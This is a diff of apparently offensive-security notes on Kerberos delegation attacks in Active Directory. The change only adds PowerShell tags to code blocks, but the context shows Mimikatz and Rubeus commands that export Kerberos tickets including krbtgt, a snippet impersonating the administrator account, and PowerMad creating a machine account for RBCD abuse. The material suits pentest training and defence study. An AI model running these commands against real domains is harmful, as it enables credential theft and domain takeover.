@@ -10,7 +10,7 @@ When a user authenticates to a computer that has unresitricted kerberos delegati
 
 <mark style="color:green;">User ---> authenticates to ---> IIS server ---> authenticates on behalf of the user ---> DB server</mark>
 
-```
+```powershell
 # get tickets
 privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export
 Rubeus dump /service:krbtgt /nowrap
@@ -66,7 +66,7 @@ The TGT for the machine account of the DC should come in in the first session. W
 
 ## <mark style="color:red;">Constrained Delegation</mark>
 
-```
+```powershell
 # get tickets
 privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export
 Rubeus dump /service:krbtgt /nowrap
@@ -122,7 +122,7 @@ Get-NetComputer ws02 | Select-Object -ExpandProperty msds-allowedtodelegateto | 
 
 impersonate the administrator account:
 
-```
+```powershell
 [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
 $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
 $idToImpersonate.Impersonate()
@@ -159,7 +159,7 @@ In this scenario, `s4u2self` and `s4u2proxy` are used as above to request a forw
 
 A more often-seen attack to RBCD is when we have `GenericWrite`, `GenericAll`, `WriteProperty`, or `WriteDACL` permissions to a computer object in the domain. This means we can write the `msDS-AllowedToActOnBehalfOfOtherIdentity` property on this machine account to add a controlled SPN or machine account to be trusted for delegation. We can even create a new machine account and add it. This allows us to compromise the target machine in the context of any user, as with constrained delegation.
 
-```
+```powershell
 # Create a new machine account using PowerMad
 import-module powermad
 New-MachineAccount -MachineAccount NewMachine -Password $(ConvertTo-SecureString 'P4ssword123!' -AsPlainText -Force)
